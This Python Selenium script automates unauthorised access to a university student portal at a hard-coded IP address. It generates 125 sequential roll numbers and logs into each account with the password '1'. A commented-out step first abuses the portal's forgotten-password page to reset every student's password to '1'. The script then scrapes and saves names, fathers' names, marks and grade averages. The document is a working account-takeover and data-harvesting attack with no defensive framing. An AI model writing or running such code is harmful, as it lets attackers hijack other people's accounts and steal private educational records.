from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
import time
import json
import multiprocessing
from bs4 import BeautifulSoup

def collect_metadata(header):
    meta_data = {}
    for i in header:
        temp = i.find_all("td")
        for j in range(0,len(temp),2):
            meta_data[temp[j].text.replace(":","").strip()] = temp[j+1].text.strip()
    return meta_data

def collect_markdata(marks):
    marks_data = []
    for i in marks:
        temp = i.find_all("td", recursive=False)
        # marks_data[temp[0].text.replace('\n', "").strip()] = []
        temp_marks = []
        for j in range(0, len(temp)):
            temp_marks.append(temp[j].text.replace('\n', "").strip())
        marks_data.append(temp_marks)
    return marks_data[1:-1]

def collect_resultdata(result):
    result_data = {}
    result_data["SGPA"] = result[3].text.strip()
    result_data["CGPA"] = result[5].text.strip()
    return result_data
    
def table_to_json(table, user_data):
    
    # inital config
    soup = BeautifulSoup(table, "html.parser")
    html_table = soup.find("table").find("tbody")
    html_table = html_table.find_all("tr", recursive=False)

    # collection of meta data
    header = html_table[2].find("tbody").find_all("tr", recursive=False)
    meta_data = collect_metadata(header)
            
    # marks data
    marks = html_table[3].find("tbody").find_all("tr", recursive=False)
    marks_data = collect_markdata(marks)

    # cgpa data
    result = html_table[5].find("tbody").find("tr").find_all("td", recursive=False)
    result_data = collect_resultdata(result)
    # print(meta_data.keys())
    for key in meta_data.keys():
        user_data[key] = meta_data[key]
    
    user_data["marksData"][user_data["Semester"]] = marks_data
    user_data["resultData"][user_data["Semester"]] = result_data
    
    return user_data

def process_student(roll_number):
    driver = webdriver.Chrome()
    user_data = {
        "Name": "",
        "Branch": "",
        "Semester": "",
        "Father's Name": "",
        "Roll No": "",
        "marksData": {},
        "resultData": {}
    }
    try:
        print(f"Processing {roll_number}...")
        
        # Step 1: Open the forget password page
        # driver.get("http://202.168.87.90/StudentPortal/ForgetPassword.aspx")
        # time.sleep(2)
        
        # driver.find_element(By.ID, "txt_username").send_keys(roll_number)
        # driver.find_element(By.ID, "txtnewpass").send_keys("1")
        # driver.find_element(By.ID, "txtConfirmpass").send_keys("1")
        # driver.find_element(By.ID, "btnSubmit").click()
        # time.sleep(3)
        # alert = driver.switch_to.alert
        # alert.accept()
        
        # Step 2: Login
        driver.get("http://202.168.87.90/StudentPortal/Login.aspx")
        time.sleep(2)
        
        driver.find_element(By.ID, "txt_username").send_keys(roll_number)
        driver.find_element(By.ID, "txt_password").send_keys("1")
        driver.find_element(By.ID, "btnSubmit").click()
        time.sleep(5)
        
        # Step 3: Select semester and show results
        if driver.current_url == "http://202.168.87.90/StudentPortal/default.aspx":
            select_element = Select(driver.find_element(By.ID, "ddlSemester"))
            select_element.select_by_value("2")
            driver.find_element(By.ID, "btnimgShowResult").click()
            time.sleep(5)
            
            # Extract table data
            table = driver.find_element(By.XPATH, "//table[@width='95%']")
            rows = table.find_elements(By.TAG_NAME, "tr")
            
            # result_data = []
            table_html = table.get_attribute('outerHTML')
            
            user_data = table_to_json(table_html, user_data)
            user_data.pop("Semester")
            
            # for row in rows:
            #     cells = row.find_elements(By.TAG_NAME, "td")
            #     result_data.append([cell.text for cell in cells])
            
            # Save results
            with open(f"second/{roll_number}.json", "w") as file:
                json.dump(user_data, file, indent=4)
            
            with open(f"second/{roll_number}.html", "w", encoding="utf-8") as file:
                file.write(table_html)
            
            print(f"{roll_number} results saved.")
        else:
            print(f"Login failed for {roll_number}")
    except Exception as e:
        print(f"Error processing {roll_number}: {e}")
    finally:
        driver.quit()

if __name__ == "__main__":
    roll_numbers = [f"2023UGCS{str(i).zfill(3)}" for i in range(1, 126)]
    with multiprocessing.Pool(processes=25) as pool:  # Adjust process count as needed
        pool.map(process_student, roll_numbers)
